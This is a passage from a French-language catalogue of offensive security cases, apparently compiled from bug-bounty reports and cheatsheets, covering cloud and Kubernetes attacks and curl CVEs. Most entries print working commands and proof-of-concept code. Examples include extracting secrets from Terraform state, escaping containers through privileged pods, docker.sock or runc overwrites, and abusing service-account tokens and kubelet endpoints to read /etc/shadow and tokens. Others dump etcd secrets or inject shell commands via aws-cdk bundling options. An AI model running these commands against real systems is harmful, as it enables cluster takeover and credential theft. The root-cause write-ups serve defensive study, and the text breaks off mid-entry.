aws s3 cp s3://company-terraform-state/prod/terraform.tfstate . --no-sign-request

Extraction des secrets en clair depuis le JSON téléchargé :
cat terraform.tfstate | jq '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes.password'
cat terraform.tfstate | jq '.. | .private_key? // empty'
grep -oE '"(password|secret|private_key|api_key)"\s*:\s*"[^"]+"' terraform.tfstate

Un seul fichier .tfstate d'une infra de taille moyenne contient typiquement : mots de passe RDS générés, clés privées TLS, tokens d'API tierces provisionnées via Terraform, et la topologie réseau complète (VPC, sous-réseaux, security groups) -- une carte complète pour la suite de l'attaque.
```

**Techniques :** terraform-state-exposure, plaintext-secret-in-iac-state

---

## Command Injection

*1 cas.*

### Command Injection via Unsanitized Bundling Options in `aws-cdk-lib aws-lambda-nodejs`

**📄 Cas réel**
sévérité : high · CWE-78 · [source](https://hackerone.com/reports/3558713)

The NodejsFunction construct of aws-cdk-lib's aws-lambda-nodejs module assembles a shell command from several user-controlled bundling properties (externalModules, define, loader, inject, esbuildArgs) without escaping shell metacharacters, then executes it via spawnSync with shell interpretation. An attacker controlling these properties — via a malicious published CDK construct or a malicious pull request — can inject arbitrary OS commands executed during cdk synth/deploy/diff.

**Cause racine :** Bundling property values are interpolated without escaping into a shell command string executed via spawnSync with shell interpretation (cmd /c / bash -c).

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable sink (packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts:245-266, values interpolated with ZERO escaping):
const esbuildCommand: string[] = [
  options.esbuildRunner, '--bundle', `"${relativeEntryPath}"`, ...,
  ...this.externals.map(external => `--external:${external}`),                    // L255, no escaping
  ...loaders.map(([ext, name]) => `--loader:${ext}=${name}`),                      // L256, no escaping
  ...defines.map(([key, value]) => `--define:${key}=${JSON.stringify(value)}`),    // L257, KEY not escaped
  ...this.props.inject ? this.props.inject.map(i => `--inject:"${i}"`) : [],       // L265, no escaping
];
// L302: esbuildCommand.join(' ')  -- single space-joined string
// L334-349: exec(win32 ? 'cmd' : 'bash', [win32 ? '/c' : '-c', localCommand], {...})  -- full shell interpretation

PoC CDK stack (payload hidden in a bundling property, e.g. externalModules of a published construct):
new NodejsFunction(this, 'MyHandler', {
  entry: path.join(__dirname, 'lambda', 'lambda-handler.ts'),
  runtime: Runtime.NODEJS_20_X,
  bundling: {
    externalModules: ['foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt'],
    define: { 'FOO & echo PWNED_VIA_DEFINE > pwned_def.txt': 'bar' }
  }
});

Run: npx ts-node app.ts  (triggers cdk synth's local bundling)
Assembled shell command actually executed:
npx.cmd --no-install esbuild --bundle "...\lambda-handler.ts" ... --external:foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt --define:FOO & echo PWNED_VIA_DEFINE > pwned_def.txt="bar"
-> the bare & splits it into 3 shell commands; verify with `type pwned_ext.txt` / `cat pwned_ext.txt` -> both attacker files exist, confirming RCE on any machine running cdk synth/deploy/diff against a malicious construct or PR.
```

**Techniques :** shell-metacharacter-injection, supply-chain-attack, unsanitized-string-concatenation, spawnsync-shell-exec

**Correspond aux classes qualifiantes :** rce

**Signal (endpoints/fonctions observés) :**
- `packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts`
- `createBundlingCommand()`
- `exec()`

**Paramètres impliqués :** `externalModules`, `define`, `loader`, `inject`, `esbuildArgs`, `banner`, `footer`

---

## Kubernetes & Conteneurs — Escape, RBAC, Supply Chain

*11 cas.*

### Évasion de conteneur via un pod privileged montant le filesystem hôte

**🧾 Cheatsheet**
sévérité : critical · CWE-250

Un conteneur lancé avec `securityContext.privileged: true` désactive quasiment tous les mécanismes d'isolation du noyau (capabilities Linux complètes, accès direct aux devices de l'hôte). Si l'attaquant peut exécuter des commandes dans un tel conteneur (via une RCE applicative ou un accès kubectl exec limité), il peut monter le disque de l'hôte directement depuis le device bloc visible dans le conteneur et en sortir un accès root complet au node.

**Cause racine :** Le pod est configuré avec `privileged: true` sans nécessité applicative réelle, exposant les devices bloc de l'hôte dans le namespace du conteneur et permettant un montage direct du filesystem racine de l'hôte.

**Preuve technique (verbatim depuis la source) :**

```
Depuis un shell dans le conteneur privilégié, identifier et monter le disque de l'hôte :
fdisk -l  # lister les devices bloc visibles (ex: /dev/sda1 correspond au disque de l'hôte)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# accès root complet au filesystem de l'hôte, y compris /etc/shadow, les clés SSH, les kubeconfig d'autres services

Manifeste de pod minimal démontrant la configuration vulnérable (pour la preuve de concept si l'attaquant peut soumettre ses propres manifestes) :
apiVersion: v1
kind: Pod
metadata:
  name: poc-privileged
spec:
  containers:
  - name: poc
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
```

**Techniques :** privileged-container-escape, host-filesystem-mount-chroot

**Correspond aux classes qualifiantes :** privilege-escalation

---

### Élévation vers cluster-admin via un ServiceAccount sur-permissionné monté dans un pod applicatif

**🧾 Cheatsheet**
sévérité : critical · CWE-269

Kubernetes monte automatiquement un token de ServiceAccount dans chaque pod (`/var/run/secrets/kubernetes.io/serviceaccount/token`), utilisable directement contre l'API server. Si ce ServiceAccount est lié (via un `ClusterRoleBinding`) à un rôle bien plus large que ce dont le pod a besoin (souvent `cluster-admin` copié depuis un exemple de documentation), une RCE dans N'IMPORTE QUEL pod utilisant ce ServiceAccount donne un contrôle total du cluster entier.

**Cause racine :** Le ServiceAccount du pod est lié à un ClusterRole excessivement permissif (souvent cluster-admin) au lieu d'un Role namespacé avec les seules permissions strictement nécessaires à l'application (principe du moindre privilège non appliqué au RBAC).

**Preuve technique (verbatim depuis la source) :**

```
Depuis un shell dans le pod compromis, extraire le token et l'utiliser contre l'API server :
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Vérifier les permissions réelles du ServiceAccount
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -X POST \
  -H 'Content-Type: application/json' -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# Si cluster-admin confirmé, créer un pod privilégié dans n'importe quel namespace pour pivoter
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -X POST $APISERVER/api/v1/namespaces/kube-system/pods \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"poc-privesc"},"spec":{"containers":[{"name":"poc","image":"alpine","command":["sleep","3600"],"securityContext":{"privileged":true}}],"hostPID":true}}'

Outil d'automatisation : kubiscan (scanne les RBAC risqués), ou simplement `kubectl auth can-i --list` si kubectl est disponible avec le token extrait.
```

**Techniques :** serviceaccount-token-abuse, rbac-privilege-escalation, clusterrolebinding-overpermission

**Correspond aux classes qualifiantes :** privilege-escalation

---

### API Server Kubernetes exposé avec anonymous-auth activé — accès non authentifié au cluster

**🧾 Cheatsheet**
sévérité : critical · CWE-306

Un API server Kubernetes exposé sur internet (souvent via un cloud provider mal configuré, port 6443 ou 8080 accessible publiquement) avec `--anonymous-auth=true` (parfois le défaut historique sur d'anciennes versions ou des installations kubeadm mal durcies) accepte les requêtes sans authentification, les traitant sous l'identité `system:anonymous` -- si un RoleBinding accorde par erreur des permissions à ce groupe (souvent via `system:unauthenticated`), l'attaquant obtient un accès direct à l'API sans jamais présenter de credentials.

**Cause racine :** L'API server accepte les requêtes anonymes (`--anonymous-auth=true`, souvent combiné à `--insecure-port` sur les installations legacy) et un RBAC trop permissif accorde des droits au groupe `system:unauthenticated`.

**Preuve technique (verbatim depuis la source) :**

```
Détection et énumération directe sans aucune credential :
curl -k https://target-cluster:6443/api/v1/namespaces/default/pods
curl -k https://target-cluster:6443/api/v1/namespaces/kube-system/secrets

Si la réponse retourne du JSON structuré (liste de pods/secrets) au lieu d'un 401/403, l'accès anonyme est confirmé.

Énumération plus large avec kubectl configuré sans credentials (juste le endpoint) :
kubectl --server=https://target-cluster:6443 --insecure-skip-tls-verify=true get pods --all-namespaces
kubectl --server=https://target-cluster:6443 --insecure-skip-tls-verify=true get secrets --all-namespaces -o json

Outil de scan de masse pour ce type d'exposition : Shodan/Censys avec la requête `product:"Kubernetes"` combinée à un test automatisé de anonymous-auth sur les résultats.
```

**Techniques :** anonymous-auth-enabled, unauthenticated-api-server-access

**Correspond aux classes qualifiantes :** auth-bypass

**Signal (endpoints/fonctions observés) :**
- `GET /api/v1/pods`
- `GET /api/v1/secrets`

---

### Port Kubelet read-only 10255 non authentifié — exécution de commandes via le endpoint run

**🧾 Cheatsheet**
sévérité : critical · CWE-306

L'API Kubelet (l'agent qui tourne sur chaque node Kubernetes) expose historiquement un port read-only (10255) sans authentification pour la supervision, mais aussi -- sur des configurations plus anciennes ou mal durcies -- le port principal 10250 sans authentification/autorisation stricte, exposant le endpoint `/run/` qui permet d'EXÉCUTER des commandes arbitraires dans n'importe quel conteneur du node, une capacité bien au-delà de la simple lecture attendue sur ces ports.

**Cause racine :** Le Kubelet est démarré avec `--anonymous-auth=true` et/ou `--authorization-mode=AlwaysAllow` sur le port API (10250) au lieu du mode webhook par défaut recommandé, et/ou le port legacy read-only 10255 (jamais authentifié par design) reste actif et accessible depuis l'extérieur du réseau du cluster.

**Preuve technique (verbatim depuis la source) :**

```
Énumération des pods/conteneurs via le port read-only (aucune authentification requise, jamais possible de la désactiver sur ce port par design) :
curl -k http://target-node:10255/pods

Si le port 10250 (API complète) est également mal configuré, exécution de commande directe dans un conteneur identifié :
curl -k -X POST "https://target-node:10250/run/default/victim-pod/victim-container?cmd=cat+/etc/shadow"

# Variante d'énumération de tous les secrets montés dans tous les pods du node via ce même accès :
curl -k -X POST "https://target-node:10250/run/default/victim-pod/victim-container?cmd=env"
curl -k -X POST "https://target-node:10250/run/default/victim-pod/victim-container?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token"

Outil dédié : kube-hunter (Aqua Security) automatise la détection de ces ports Kubelet exposés lors d'un scan de reconnaissance réseau.
```

**Techniques :** kubelet-readonly-port-abuse, kubelet-exec-endpoint-rce

**Correspond aux classes qualifiantes :** rce, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `GET /pods`
- `POST /run/{namespace}/{pod}/{container}`

**Paramètres impliqués :** `cmd`

---

### Évasion vers root sur l'hôte via le socket Docker monté dans un conteneur (/var/run/docker.sock)

**🧾 Cheatsheet**
sévérité : critical · CWE-250

Monter `/var/run/docker.sock` dans un conteneur (pattern fréquent pour permettre à un conteneur de gérer d'autres conteneurs, ex: CI/CD runners, outils de monitoring 'docker-in-docker') donne à ce conteneur un contrôle TOTAL sur le démon Docker de l'HÔTE -- équivalent à un accès root sur la machine hôte, puisque n'importe quel conteneur peut être lancé avec des privilèges arbitraires (montage du filesystem racine, mode privileged) depuis ce socket.

**Cause racine :** Le socket Unix du démon Docker de l'hôte est monté en volume à l'intérieur d'un conteneur applicatif, donnant à ce conteneur (et donc à quiconque y exécute du code) un contrôle administratif complet sur TOUS les conteneurs et, par extension, sur l'hôte lui-même.

**Preuve technique (verbatim depuis la source) :**

```
Depuis un shell dans le conteneur ayant accès au socket monté, utiliser le client Docker (ou curl directement sur le socket si le binaire docker n'est pas installé) pour lancer un nouveau conteneur montant le filesystem racine de l'hôte :
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host /bin/bash
# accès root complet au filesystem de l'hôte

Si le binaire docker n'est pas disponible, requête HTTP directe sur le socket Unix via curl :
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","/bin/bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# puis démarrer le conteneur créé via /containers/{id}/start et s'y attacher via /containers/{id}/attach
```

**Techniques :** docker-socket-exposure, sibling-container-escape

**Correspond aux classes qualifiantes :** privilege-escalation

---

### Extraction de tous les Secrets Kubernetes en clair via un accès direct à etcd non chiffré

**🧾 Cheatsheet**
sévérité : critical · CWE-312

Par défaut, Kubernetes stocke les objets Secret dans etcd encodés en base64 (PAS chiffrés) sauf si le chiffrement au repos (`EncryptionConfiguration`) est explicitement activé. Un accès réseau direct à etcd (port 2379, souvent accessible depuis le réseau interne du cluster sans authentification mTLS correctement forcée sur des installations mal durcies) permet de dumper TOUS les secrets de TOUS les namespaces en une seule opération, contournant entièrement le RBAC Kubernetes qui ne s'applique qu'au niveau de l'API server.

**Cause racine :** etcd est accessible sans authentification client-certificat (mTLS) correctement forcée, et le chiffrement au repos des Secrets Kubernetes n'est pas activé, laissant les credentials accessibles en base64 (trivialement décodable) à quiconque atteint etcd directement.

**Preuve technique (verbatim depuis la source) :**

```
Accès direct à etcd depuis un poste ayant une connectivité réseau vers le port 2379 (ex: un pod compromis sur le même réseau que les control-plane nodes) :
ETCDCTL_API=3 etcdctl --endpoints=https://etcd-node:2379 \
  --cert=/path/to/cert.pem --key=/path/to/key.pem --cacert=/path/to/ca.pem \
  get /registry/secrets --prefix --keys-only

# Si aucune authentification n'est requise du tout (mal configuré) :
ETCDCTL_API=3 etcdctl --endpoints=http://etcd-node:2379 get /registry/secrets/default/db-credentials

# Décodage du secret extrait (les valeurs sont en base64 dans le champ 'data' du JSON stocké) :
echo '<valeur base64 extraite>' | base64 -d

Détection préliminaire du chiffrement au repos : vérifier si /registry/secrets/... contient 'k8s:enc:' en préfixe (chiffré, protégé) ou du JSON/protobuf lisible directement (non chiffré, vulnérable).
```

**Techniques :** etcd-unauthenticated-access, kubernetes-secrets-plaintext-storage

---

### CVE-2019-5736 — Évasion de conteneur runc via écrasement du binaire runc de l'hôte

**📄 Cas réel**
sévérité : critical · CWE-362

CVE-2019-5736 (2019) exploite le fait que runc (le runtime bas-niveau utilisé par Docker/containerd/Kubernetes) ouvre `/proc/self/exe` de son propre processus lors du démarrage d'un conteneur. Un conteneur MALVEILLANT (contrôlé par l'attaquant, pas besoin de privileged) peut remplacer son propre binaire cible pour que, lors de la PROCHAINE exécution de `runc exec` par un administrateur légitime dans ce même conteneur, le binaire runc de l'HÔTE lui-même soit écrasé par un payload attaquant -- code exécuté avec les privilèges root de l'hôte dès la prochaine invocation de runc sur N'IMPORTE QUEL conteneur du système.

**Cause racine :** runc (versions <1.0-rc7) ouvre son propre binaire hôte en écriture via un descripteur de fichier obtenu par le conteneur via /proc/self/exe pendant une fenêtre de course, permettant à un processus malveillant dans le conteneur d'écrire dans ce descripteur avant que runc ne termine son exécution, corrompant ainsi le binaire runc de l'hôte.

**Preuve technique (verbatim depuis la source) :**

```
PoC public de référence (Frichetten/CVE-2019-5736-PoC, adapté selon le shell disponible dans le conteneur cible) :
#!/bin/bash
payload=$(printf '#!/bin/bash\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash' )
for i in $(seq 1 100); do
  if [ -x /proc/$i/exe ] && readlink /proc/$i/exe 2>/dev/null | grep -q runc; then
    echo "$payload" > /proc/$i/exe 2>/dev/null && echo "écrasement réussi sur PID $i"
  fi
done

# Version pratique documentée : placer un binaire malveillant nommé comme le shell attendu
# du conteneur (ex: #!/proc/self/exe) puis attendre qu'un admin fasse `docker exec` /
# `kubectl exec` dans ce conteneur -- runc écrit alors le nouveau processus PAR-DESSUS
# le binaire runc hôte en cours d'exécution, corrompant définitivement le binaire pour
# toute exécution future sur le node entier.
CVE corrigée dans runc >=1.0-rc7 (mitigation : copie du binaire dans un fichier temporaire en lecture seule avant exécution au lieu d'un accès direct via /proc/self/exe).
```

**Techniques :** runc-binary-overwrite, proc-self-exe-race-condition

**Correspond aux classes qualifiantes :** rce, race-condition

---

### Contournement d'un Admission Controller via une ressource Ingress-nginx exploitant CVE-2021-25742

**🧾 Cheatsheet**
sévérité : high · CWE-863

L'annotation `nginx.ingress.kubernetes.io/configuration-snippet` permet d'injecter des directives de configuration nginx brutes dans le contrôleur Ingress partagé -- une fonctionnalité puissante mais dangereuse en environnement multi-tenant si un OPA Gatekeeper/Admission Controller censé bloquer cette annotation pour les utilisateurs non privilégiés peut être contourné en fournissant l'annotation via une casse alternative ou un chemin de validation non couvert par la policy (ex: mise à jour de l'Ingress après création au lieu de validation seulement à la création).

**Cause racine :** L'Admission Controller (OPA Gatekeeper, Kyverno, ou policy custom) valide l'absence de l'annotation `configuration-snippet` uniquement sur l'opération CREATE d'une ressource Ingress, sans revalider la même contrainte sur les opérations UPDATE/PATCH ultérieures.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- créer un Ingress SANS l'annotation sensible (passe l'admission controller) :
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: poc-ingress
spec:
  rules:
  - host: poc.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend: {service: {name: legit-svc, port: {number: 80}}}

kubectl apply -f poc-ingress.yaml

Étape 2 -- PATCH l'Ingress existant pour ajouter l'annotation sensible (si l'admission webhook ne re-valide pas les UPDATE) :
kubectl annotate ingress poc-ingress \
  nginx.ingress.kubernetes.io/configuration-snippet="proxy_pass http://attacker-controlled-service/;" --overwrite

Si accepté, le trafic destiné au service légitime peut être redirigé vers une destination contrôlée par l'attaquant au niveau du contrôleur Ingress partagé, affectant potentiellement d'autres tenants du même cluster.
```

**Techniques :** ingress-annotation-injection, admission-controller-bypass

**Correspond aux classes qualifiantes :** privilege-escalation

**Paramètres impliqués :** `nginx.ingress.kubernetes.io/configuration-snippet`

---

### Identifiants faibles par défaut laissés dans un values.yaml Helm non modifié en production

**🧾 Cheatsheet**
sévérité : high · CWE-798

De nombreux Helm charts publics (bases de données, dashboards d'administration comme Grafana/Kibana/Jenkins) définissent des identifiants par défaut dans leur `values.yaml` (souvent `admin`/`admin`, ou un mot de passe généré une seule fois lors du premier déploiement mais jamais changé ensuite) -- si l'équipe déploie le chart sans surcharger ces valeurs par défaut via un values.yaml personnalisé ou des secrets externes, l'application tourne en production avec des identifiants publiquement documentés dans le repository du chart lui-même.

**Cause racine :** Le chart Helm est déployé avec les valeurs par défaut du values.yaml public (identifiants faibles ou statiques) sans les surcharger via un fichier de valeurs spécifique à l'environnement de production ou un gestionnaire de secrets externe (Vault, Sealed Secrets).

**Preuve technique (verbatim depuis la source) :**

```
Reconnaissance : identifier le chart utilisé via les labels/annotations Kubernetes exposés (souvent visible via un dashboard de monitoring ou d'erreurs exposé publiquement, ex: `app.kubernetes.io/managed-by: Helm`, `helm.sh/chart: grafana-6.x.x`) puis consulter le values.yaml public correspondant sur artifacthub.io/GitHub pour identifier les identifiants par défaut documentés :
helm show values grafana/grafana | grep -A3 adminPassword
# Souvent : adminPassword: "" (généré aléatoirement mais accessible via kubectl si le déploiement a échoué à le personnaliser)

Si un mot de passe généré est stocké dans un Secret Kubernetes lisible (accès RBAC insuffisamment restreint) :
kubectl get secret grafana-admin --template='{{index .data "admin-password" | base64decode}}'

Test direct des identifiants par défaut documentés publiquement pour d'autres charts connus (Jenkins, Kibana, phpMyAdmin déployés via Helm) sur l'interface de login exposée.
```

**Techniques :** helm-default-credentials, values-yaml-hardcoded-secrets

---

### Contournement du mTLS Istio via le mode PERMISSIVE laissé actif entre services

**🧾 Cheatsheet**
sévérité : high · CWE-300

Istio propose un mode mTLS `PERMISSIVE` (accepte à la fois le trafic chiffré mTLS ET le trafic en clair non chiffré) comme étape de migration progressive vers `STRICT` -- souvent laissé en PERMISSIVE indéfiniment par commodité opérationnelle. Un attaquant ayant obtenu un accès réseau à un pod du cluster (via une SSRF, un conteneur compromis, ou un accès à un namespace voisin insuffisamment isolé par NetworkPolicy) peut alors communiquer directement en clair avec n'importe quel service du mesh, contournant entièrement l'authentification mutuelle par certificat cliente que le mTLS est censé garantir.

**Cause racine :** La PeerAuthentication policy Istio du namespace/mesh est configurée en mode PERMISSIVE plutôt que STRICT, acceptant le trafic en clair non authentifié en plus du trafic mTLS légitime, ce qui annule la garantie d'authentification mutuelle pour tout attaquant réseau interne.

**Preuve technique (verbatim depuis la source) :**

```
Vérification du mode mTLS actif sur le mesh/namespace ciblé :
kubectl get peerauthentication -n target-namespace -o yaml
# Chercher : spec.mtls.mode: PERMISSIVE (vulnérable) vs STRICT (protégé)

Depuis un pod compromis avec accès réseau au service cible, communication directe en clair contournant l'exigence mTLS (aucun certificat client requis) :
curl -v http://internal-service.target-namespace.svc.cluster.local:8080/api/internal/admin
# Si la réponse est 200 malgré l'absence de certificat mTLS présenté, la policy PERMISSIVE
# permet un accès équivalent à un service authentifié sans jamais prouver son identité.

Combinable avec l'absence de NetworkPolicy restrictive pour élargir la portée : un pod
dans N'IMPORTE QUEL namespace du cluster peut alors atteindre ce service interne "protégé"
par mTLS en apparence, tant que la connectivité réseau L3/L4 n'est pas bloquée séparément.
```

**Techniques :** istio-permissive-mtls-bypass, service-mesh-plaintext-fallback

---

### Image Docker Hub typosquattée utilisée par erreur comme base image en production

**🧾 Cheatsheet**
sévérité : high · CWE-1357

Une simple faute de frappe dans un Dockerfile (`FROM nginx-alpne` au lieu de `FROM nginx:alpine`, ou l'usage d'un namespace utilisateur au lieu de l'image officielle, ex: `FROM libraries/python` au lieu de `FROM python`) peut faire pull une image publiée par un attaquant portant un nom quasi-identique à une image légitime populaire -- image qui peut embarquer un cryptominer, un reverse shell au démarrage, ou exfiltrer les variables d'environnement/secrets du conteneur build vers un serveur externe, le tout invisible tant que le build fonctionne apparemment normalement.

**Cause racine :** Le Dockerfile référence une image de base via un nom mal orthographié ou sans le namespace 'library/' officiel explicite, permettant à une image malveillante publiée sous un nom quasi-identique par un attaquant d'être utilisée par erreur comme base de confiance.

**Preuve technique (verbatim depuis la source) :**

```
Vérification systématique en audit : comparer chaque `FROM` d'un Dockerfile avec le nom EXACT de l'image officielle sur Docker Hub (namespace 'library/' implicite pour les images officielles, ex: `python` == `library/python`, PAS `pythonn` ni `python-official` ni un namespace utilisateur non vérifié) :
grep -E '^FROM' Dockerfile
# FROM node:18-alpne   <- typo, potentiellement une image malveillante différente de node:18-alpine

Vérification de la provenance réelle d'une image déjà en cache/déployée :
docker inspect <image> --format='{{.RepoDigests}}'
docker history <image> --no-trunc | head -20
# chercher des commandes suspectes dans l'historique des layers (curl vers un domaine inconnu,
# ajout de cron jobs, binaires de mining comme xmrig)

Outils de scan de provenance/supply chain pour CI/CD : Docker Content Trust (signature d'image),
ou Sigstore/cosign pour vérifier la signature cryptographique d'une image avant déploiement.
```

**Techniques :** docker-hub-typosquatting, malicious-base-image-supply-chain

---

## Cookie Injection / Supercookies

*1 cas.*

### CVE-2026-8924: trailing dot domain super cookie

**📄 Cas réel**
[source](https://hackerone.com/reports/3733905)

A curl build with the Public Suffix List enabled correctly rejects a cookie targeting a canonical public suffix (Domain=co.uk), but accepts the trailing-dot variant Domain=co.uk. when the request host also uses a trailing dot. In the reproduced case, a response from foo.co.uk. sets a Domain=co.uk. cookie, and curl subsequently sends that cookie to bar.co.uk. on a redirect — a supercookie that would be rejected in its canonical form.

**Cause racine :** curl's Public Suffix List check handles canonical hostnames and their trailing-dot (FQDN) variants inconsistently, wrongly accepting a public-suffix-scoped cookie when host and Domain both carry a trailing dot.

**Preuve technique (verbatim depuis la source) :**

```
Negative control (canonical, correctly rejected): foo.co.uk responds Set-Cookie: canonical=1; Domain=co.uk; Path=/ then 302s to bar.co.uk -- curl correctly does NOT forward canonical=1.

Bypass (trailing-dot variant of the exact same public suffix): foo.co.uk. responds Set-Cookie: trail=1; Domain=co.uk.; Path=/ then 302s to bar.co.uk. -- curl DOES send Cookie: trail=1 to bar.co.uk.
PoC harness uses curl's real cookie engine + local redirection to keep it self-contained:
-b ""
--connect-to foo.co.uk.:<port>:127.0.0.1:<port>
--connect-to bar.co.uk.:<port>:127.0.0.1:<port>
Run: CURL=/path/to/curl python3 curl_trailing_dot_psl_demo.py
Result line: "VULNERABLE / reproduced: bar.co.uk. received Cookie: trail=1"
Root cause: curl's Public Suffix List check treats a hostname and its trailing-dot (FQDN) form inconsistently -- the canonical form co.uk is correctly matched against the PSL and rejected as a public suffix, but co.uk. is not recognized as the same entry, so the cookie is wrongly accepted as scoped to a non-suffix domain -- a supercookie shared across any two hosts sharing that trailing-dot suffix.
```

**Techniques :** public-suffix-list-bypass, trailing-dot-normalization, supercookie, differential-testing

**Paramètres impliqués :** `Domain`, `Set-Cookie`, `--connect-to`

---

## CVE Deep Dives (curl, libcurl, misc)

*25 cas.*

### CVE-2026-3783: OAuth2 Bearer Token Leak via Redirect and .netrc in curl

**📄 Cas réel**
[source](https://hackerone.com/reports/3583983)

When curl is used with both --oauth2-bearer and --netrc and follows an HTTP redirect (-L), the OAuth2 bearer token is resent to the redirect target host even when that host differs from the original one requested. The netrc code path bypasses the Curl_auth_allowed_to_host() host-matching check that normally governs whether credentials may be sent to a given host, and redirect handling does not clear the bearer token. This is an incomplete fix for CVE-2025-14524, whose patch covered the SASL bearer path but missed the equivalent HTTP bearer output path.

**Cause racine :** The netrc branch in curl's HTTP authorization decision bypasses the host-check that would otherwise stop the OAuth2 bearer token from being resent to a different host after a redirect.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable netrc bypass (lib/http.c:820-827):
if(Curl_auth_allowed_to_host(data)
#ifndef CURL_DISABLE_NETRC
   || conn->bits.netrc       // <-- bypasses host check entirely
#endif
  )
  result = output_auth_headers(data, conn, authhost, request, path, FALSE);

Bearer output with no host check (lib/http.c:704-714):
if(authstatus->picked == CURLAUTH_BEARER) {
  if(!proxy && data->set.str[STRING_BEARER] && !Curl_checkheaders(data, STRCONST("Authorization"))) {
    auth = "Bearer";
    result = http_output_bearer(data);  // No Curl_auth_allowed_to_host() check here
  }
}
Contrast -- custom -H Authorization IS protected (lib/http.c:1828-1833), no netrc bypass in this path.
Redirect handling does NOT clear the bearer token (lib/http.c:1254-1257): STRING_BEARER survives Curl_safefree() clearing of user/passwd.

Repro:
echo "default login testuser password testpass" > /tmp/test-netrc
# redirect_servers.py: server A on :8080 replies 302 -> server B on :8081/callback; server B logs whether it received the bearer.
python3 redirect_servers.py &
curl -v --oauth2-bearer "SECRET_TOKEN" --netrc-file /tmp/test-netrc -L http://127.0.0.1:8080/redirect
# => Server B receives: Authorization: Bearer SECRET_TOKEN  (LEAK)

Control 1 (safe): curl -v -H "Authorization: Bearer SECRET_TOKEN" --netrc-file /tmp/test-netrc -L http://127.0.0.1:8080/redirect  -> header stripped, no leak.
Control 2 (safe): curl -v --oauth2-bearer "SECRET_TOKEN" -L http://127.0.0.1:8080/redirect  (no --netrc)  -> no leak.

Note: .netrc's 'default' keyword matches ALL hosts -> token leaks to ANY redirect target. Incomplete fix for CVE-2025-14524 (that patch covered lib/curl_sasl.c:444-446 only, missed this HTTP bearer path).
```

**Techniques :** credential leak via redirect, netrc host-check bypass, incomplete prior CVE fix, OAuth2 bearer token exposure

**Correspond aux classes qualifiantes :** oauth, auth-bypass, protocol-vulnerability

**Signal (endpoints/fonctions observés) :**
- `lib/http.c:822 (netrc bypass in auth header decision)`
- `lib/http.c:704-714 (bearer output, no host check)`
- `lib/http.c:1254-1257 (redirect credential clearing)`
- `lib/curl_sasl.c:444-446 (prior SASL fix)`

**Paramètres impliqués :** `--oauth2-bearer`, `--netrc`, `--netrc-file`, `-L`, `-H`

---

### CVE-2026-3784: Incorrect Proxy CONNECT Tunnel Reuse Ignoring Proxy Credentials in libcurl

**📄 Cas réel**
[source](https://hackerone.com/reports/3584903)

libcurl's connection-reuse matching functions compare proxy type, host, and port when deciding whether a pooled proxy CONNECT tunnel can be reused, but never compare the proxy username or password. When an application shares a connection cache with CURL_LOCK_DATA_CONNECT, a transfer configured with different (even invalid) proxy credentials can reuse an already-authenticated CONNECT tunnel from a prior transfer, letting its traffic ride through the proxy without a fresh CONNECT/credential check.

**Cause racine :** The proxy connection-matching logic omits the proxy username/password from its equality comparison, so authenticated tunnels are treated as interchangeable regardless of which credentials established them.

**Preuve technique (verbatim depuis la source) :**

```
Root cause: url_match_proxy_use() (lib/url.c:930-935) calls proxy_info_matches() (lib/url.c:589-595), which compares proxy type/host/port but NEVER compares proxy username/password.

Repro (python3 /tmp/run_share_connect_poc.py, two transfers via one proxy, transfer 1 creds good:good, transfer 2 creds bad:bad):
MODE noshare: first request succeeds, second FAILS with proxy auth error, proxy observes TWO CONNECT requests (correct).
MODE share (CURLSHOPT_SHARE + CURL_LOCK_DATA_CONNECT): BOTH requests succeed, proxy observes only ONE CONNECT (using good:good) -- the bad:bad transfer rides through the already-authenticated tunnel with no fresh CONNECT/credential check.
Also reproduced via a wrapper/daemon model (curl_wrap_daemon.c) simulating a service with a shared connection pool -- same result: second client's bad:bad creds succeed silently.
Affected build: curl 8.18.0 (libcurl/8.18.0 OpenSSL/3.5.5), Release-Date 2026-01-07.
```

**Techniques :** connection pool credential confusion, proxy CONNECT tunnel reuse, shared connection cache, authentication context mixing

**Correspond aux classes qualifiantes :** auth-bypass, protocol-vulnerability

**Signal (endpoints/fonctions observés) :**
- `lib/url.c: url_match_proxy_use()`
- `lib/url.c: proxy_info_matches()`

**Paramètres impliqués :** `CURLSHOPT_SHARE`, `CURL_LOCK_DATA_CONNECT`

---

### CVE-2026-3805: Heap Use-After-Free in smb_send_open() via SMB Connection Reuse

**📄 Cas réel**
CWE-416 · [source](https://hackerone.com/reports/3591944)

In curl's SMB support, smb_parse_url_path() stores req->path as a non-owning pointer into connection-owned memory. When curl processes two SMB URLs targeting the same host, connection-reuse logic frees the first connection (freeing that memory), but req->path on the easy handle still points into that freed buffer. A subsequent strlen(req->path) call reads freed heap memory, reliably crashing curl and potentially enabling information disclosure if the freed region is reallocated first.

